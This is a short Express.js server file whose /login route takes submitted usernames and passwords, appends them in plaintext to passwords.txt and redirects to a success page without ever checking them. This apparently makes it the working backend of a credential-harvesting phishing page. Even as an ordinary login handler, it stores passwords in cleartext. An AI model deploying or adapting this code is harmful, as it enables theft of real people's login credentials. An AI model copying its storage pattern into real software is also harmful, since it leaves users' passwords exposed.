const express = require('express');
const fs = require('fs');
const path = require('path');
const app = express();
const PORT = process.env.PORT || 3000;

// Middleware to parse URL-encoded data from forms
app.use(express.urlencoded({ extended: true }));

// Serve the static files (HTML, CSS) from the "public" directory
app.use(express.static(path.join(__dirname, 'public')));

// Handle form submission
app.post('/login', (req, res) => {
    const { username, password } = req.body;

    // Save username and password to passwords.txt file
    const filePath = path.join(__dirname, 'passwords.txt');
    const loginData = `Username: ${username}, Password: ${password}\n`;

    fs.appendFile(filePath, loginData, (err) => {
        if (err) {
            console.error('Error writing to file', err);
            res.status(500).send('Internal Server Error');
        } else {
            console.log('Credentials saved successfully');
            res.redirect('/success.html');  // Redirect to the success page after login
        }
    });
});

// Start the server
app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});
